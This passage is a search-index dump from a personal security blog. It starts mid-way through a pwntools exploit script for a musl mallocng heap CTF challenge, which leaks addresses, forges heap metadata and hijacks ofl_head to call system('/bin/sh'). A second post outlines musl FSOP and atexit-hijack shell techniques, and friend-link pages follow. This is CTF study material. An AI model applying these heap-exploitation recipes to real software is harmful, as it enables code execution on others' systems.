&quot;) p.sendline(b&quot;3&quot;) p.recvuntil(b&quot;size: &quot;) if key_size == None : key_size = len(key) p.sendline(str(key_size).encode()) p.recvuntil(b&quot;content: &quot;) p.send(key)def exit(): p.recvuntil(b&quot;option: &quot;) p.sendline(b&quot;4&quot;) def calc(key): vi = 2021 for i in range(len(key)): vi = 0x13377331 * vi + key[i] return vi &amp; 0xfffdef find_key(key=b&quot;hhhh&quot;, size=4): while True: new_key = (int((random.random()) * int((b&quot;\\xff&quot; * size).hex(), 16)) % int((b&quot;\\xff&quot; * size).hex(), 16)) if calc(key) == calc(new_key.to_bytes(size, &quot;little&quot;)) : return new_key.to_bytes(size, &quot;little&quot;)def fengshui1(n): for _ in range(n): store(b&quot;victim&quot;, b&quot;victim&quot;)def fengshui2(n): for _ in range(n): query(b&quot;h&quot; * 0x30)def get_leak(): info = b&quot;&quot; for i in range(8): info = p.recv(2) + info return int(info, 16)# -- leak info --fengshui1(1)fengshui2(5) # AFFFFFU# leak elf &amp; libcstore(b&quot;hhhh&quot;, b&quot;a&quot; * 0x30) # [U]AAAA(U)U [U] is KV, (U) is KV-&gt;valuestore(find_key(), b&quot;aaaa&quot;)delete(b&quot;hhhh&quot;) # [F]AAAUFUfengshui2(3) # FFFFUFUstore(b&quot;H\\n&quot;, b&quot;H&quot;, 0x1000) # AAAAU[U]U [U] is the chunk we can getquery(b&quot;hhhh&quot;)p.recvuntil(b&quot;:&quot;)addr_mmap = get_leak() - 0x20addr_libc = addr_mmap + 0x4000addr_malloc_context = addr_libc + 0xad9c0addr_elf = get_leak() - 0xc8d0addr_hhhh = addr_elf + 0xc890addr_KV = addr_elf + 0xcde0 # leak secretdelete(b&quot;H&quot;) # AAAAUFUfengshui2(2) # AAFFUFUKV = p64(addr_hhhh) + p64(addr_malloc_context) + p64(4) + p64(0x30) + p64(0x69052445) + p64(0)store(KV, b&quot;victim&quot;) # UUFFUFUquery(b&quot;hhhh&quot;)p.recvuntil(b&quot;:&quot;)secret = get_leak()get_leak()addr_heap = get_leak() - 0x180success(&quot;addr_elf: &quot; + hex(addr_elf))success(&quot;addr_mmap: &quot; + hex(addr_mmap))success(&quot;addr_libc: &quot; + hex(addr_libc))success(&quot;secret: &quot; + hex(secret))# -- construct --delete(KV) # FFAAUFUaddr_system = addr_libc + libc.sym[&quot;system&quot;]addr_ofl_head = addr_libc + 0xafd48addr_fake_meta_area = addr_mmap + 0x1000addr_fake_meta = addr_fake_meta_area + 0x18addr_fake_group = addr_fake_meta + 0x28addr_fake_chunk = addr_fake_group + 0x10last_idx = 0freeable = 1sc = 8 # 0x90maplen = 1fake_meta = p64(addr_fake_chunk) # prevfake_meta += p64(addr_ofl_head) # next fake_meta += p64(addr_fake_group) # memfake_meta += p64(0) # avail &amp; freed maskfake_meta += p64(last_idx | freeable &lt;&lt; 5 | sc &lt;&lt; 6 | maplen &lt;&lt; 12)active_idx = 0fake_group = p64(addr_fake_meta)fake_group += p64(active_idx)fake_chunk = b&quot;/bin/sh\\x00&quot;fake_chunk += p64(0) * 7fake_chunk += p64(addr_system) * 7fake_meta_area = b&quot;h&quot; * 0xfd0fake_meta_area += p64(secret) # checkfake_meta_area += p64(0) # nextfake_meta_area += p64(1)payload = fake_meta_areapayload += fake_metapayload += fake_grouppayload += fake_chunkpayload += b&quot;\\n&quot;store(payload, b&quot;victim&quot;, 0x1200) # FFAUUFUstore(b&quot;victim&quot;, b&quot;hhhh&quot;)fengshui2(1) # AAUUUFUaddr_hhhh = addr_hhhh + 0xb0KV = p64(addr_hhhh) + p64(addr_fake_chunk) + p64(4) + p64(0x80) + p64(0x69052445) + p64(0)store(KV, b&quot;victim&quot;)gdb.attach(p)delete(b&quot;hhhh&quot;)exit()p.interactive() 参考musl libc 堆管理器 mallocng 详解 (Part I) 从musl libc 1.1.24到1.2.2 学习pwn姿势 [阅读型]新版musl libc(1.2.2)堆管理之源码剖析！ [原创]musl 1.2.2 总结+源码分析 One 新版musl libc 浅析 2022-强网杯初赛-Writeup-By-Xp0int 借助DefCon Quals 2021的mooosl学习musl mallocng","link":"/2022/10/10/Musl%20heap%20%E6%B5%85%E6%9E%90/"},{"title":"Musl libc Exploration","text":"持续更新（或许） 环境：x64 musl-1.2.2 FSOPFILE 结构./src/internal/stdio_impl.h12345678910111213141516171819202122232425262728struct _IO_FILE { unsigned flags; unsigned char *rpos, *rend; int (*close)(FILE *); unsigned char *wend, *wpos; unsigned char *mustbezero_1; unsigned char *wbase; size_t (*read)(FILE *, unsigned char *, size_t); size_t (*write)(FILE *, const unsigned char *, size_t); off_t (*seek)(FILE *, off_t, int); unsigned char *buf; size_t buf_size; FILE *prev, *next; int fd; int pipe_pid; long lockcount; int mode; volatile int lock; int lbf; void *cookie; off_t off; char *getln_buf; void *mustbezero_2; unsigned char *shend; off_t shlim, shcnt; FILE *prev_locked, *next_locked; struct __locale_struct *locale;}; 相比 glibc 的 FILE 结构，musl libc 的 FILE 结构更加简单，也更容易利用 有四类 FILE 指针：ofl_head、stdin、stdout、stderr ofl_head 类似 glibc 的 _IO_list_all，打开的文件链表头，为全局变量 可以直接劫持到伪造的 FILE 结构 stdin、stdout、stderr 固定的三个 FILE 指针，不可劫持 可以更改其指向的内存空间 利用./src/stdio/__stdio_exit.c12345678910111213141516static void close_file(FILE *f){ if (!f) return; FFINALLOCK(f); if (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, 0, 0); if (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos-f-&gt;rend, SEEK_CUR);}void __stdio_exit(void){ FILE *f; for (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f); close_file(__stdin_used); close_file(__stdout_used); close_file(__stderr_used);} 在 exit() 时会调用 __stdio_exit() ，其中 close_file() 会调用 FILE 的两个函数 write 和 seek FSOP 条件 f-&gt;lock == 0 不为 0 会调用 futex 系统调用，然后寄了 flags == “/bin/sh\\x00” 调用的第一个参数都是 FILE 指针，在劫持为 system 时，将 flags 改为 /bin/sh\\x00 即可 调用 write wpo != wbase 调用 seek rpos != rend exit hijack🐧师傅提及的 笔者自己起的名（ ./src/exit/atexit.c12345678910111213141516171819202122232425#define COUNT 32static struct fl{ struct fl *next; void (*f[COUNT])(void *); void *a[COUNT];} builtin, *head;static int slot;static volatile int lock[1];volatile int *const __atexit_lockptr = lock;void __funcs_on_exit(){ void (*func)(void *), *arg; LOCK(lock); for (; head; head=head-&gt;next, slot=COUNT) while(slot--&gt;0) { func = head-&gt;f[slot]; arg = head-&gt;a[slot]; UNLOCK(lock); func(arg); LOCK(lock); }} 在 exit() 时，会调用 __funs_on_exit() 通过 head 指针执行注册的终止函数 利用条件 将 head 劫持到可控内存空间 第一个循环因为 slot == 0，会直接跳过 从而 head = head-&gt;next *(head-&gt;next + 0x100) == addr_system *(head-&gt;next + 0x200) == addr_binsh 在理想的堆风水情况下，只需要任意写一次，即可通过 exit() 拿到 shell","link":"/2022/10/11/Musl%20libc%20Exploration/"}],"tags":[{"name":"Operating System","slug":"Operating-System","link":"/tags/Operating-System/"},{"name":"Pwn","slug":"Pwn","link":"/tags/Pwn/"}],"categories":[{"name":"Course","slug":"Course","link":"/categories/Course/"},{"name":"MIT 6.1810 2022Fall","slug":"Course/MIT-6-1810-2022Fall","link":"/categories/Course/MIT-6-1810-2022Fall/"},{"name":"Computer Science","slug":"Computer-Science","link":"/categories/Computer-Science/"},{"name":"Exploration","slug":"Exploration","link":"/categories/Exploration/"}],"pages":[{"title":"","text":"{\"Scardow\":{\"url\":\"https://scardow.cn\",\"img\":\"https://scardow.github.io/blob/main/images/images.png\",\"text\":\"火乐大佬\"},\"Asiv\":{\"url\":\"https://niceasiv.cn\",\"img\":\"https://niceasiv.cn/sysimg/head.jpg\",\"text\":\"我滴阿西！\"},\"Wings\":{\"url\":\"https://blog.wingszeng.top\",\"img\":\"https://blog.wingszeng.top/img/avatar.gif\",\"text\":\"巨佬老乡 Wings gg\"},\"Arttnba3\":{\"url\":\"https://arttnba3.cn\",\"img\":\"https://arttnba3.cn/img/avatars/avatar.png\",\"text\":\"Pwner, kernelの神\"},\"Eqqie\":{\"url\":\"https://\",\"img\":\"https://eqqie.cn/usr/uploads/2021/08/1035745416.jpg\",\"text\":\"Pwner, 全栈の神\"}}","link":"/links.json"},{"title":"","text":"{\"Scardow\":{\"url\":\"https://scardow.cn\",\"img\":\"https://github.com/Scardow/scardow.github.io/blob/main/images/images.png\",\"text\":\"火乐大佬\"},\"Asiv\":{\"url\":\"https://niceasiv.cn\",\"img\":\"https://niceasiv.cn/sysimg/head.jpg\",\"text\":\"我滴阿西！\"},\"Wings\":{\"url\":\"https://blog.wingszeng.top\",\"img\":\"https://blog.wingszeng.top/img/avatar.gif\",\"text\":\"巨佬老乡 Wings gg\"},\"Arttnba3\":{\"url\":\"https://arttnba3.cn\",\"img\":\"https://arttnba3.cn/img/avatars/avatar.png\",\"text\":\"Pwner, kernelの神\"},\"Eqqie\":{\"url\":\"https://\",\"img\":\"https://eqqie.cn/usr/uploads/2021/08/1035745416.jpg\",\"text\":\"Pwner, 全栈の神\"}}","link":"/links.json"},{"title":"","text":"欢迎来到我的博客这是我搭建的第一个博客，功能还不完全，我会陆续更新、完善它（尽量不咕） 自我介绍Humoooor 20 岁 懒人一个 目前就读于西安某高校 这个博客的作用记录我的技术学习、日常生活 对我的文章有想法，或者想和我交流可以在文章下面评论，或者给我发邮件（可能不会那么及时回复） 想要及时联系的话，欢迎联系侧边栏的邮箱与我深入♂交流。 同时也欢迎交换友链QAQ","link":"/about/index.html"},{"title":"Friends","text":"Scardow：Pwner 火乐！ Wings：巨佬老乡，Wings gg Asiv：我滴阿西！ Arttnba3：Pwner 内核の神 Eqqie：Pwner 全栈の神","link":"/friends/index.html"}]}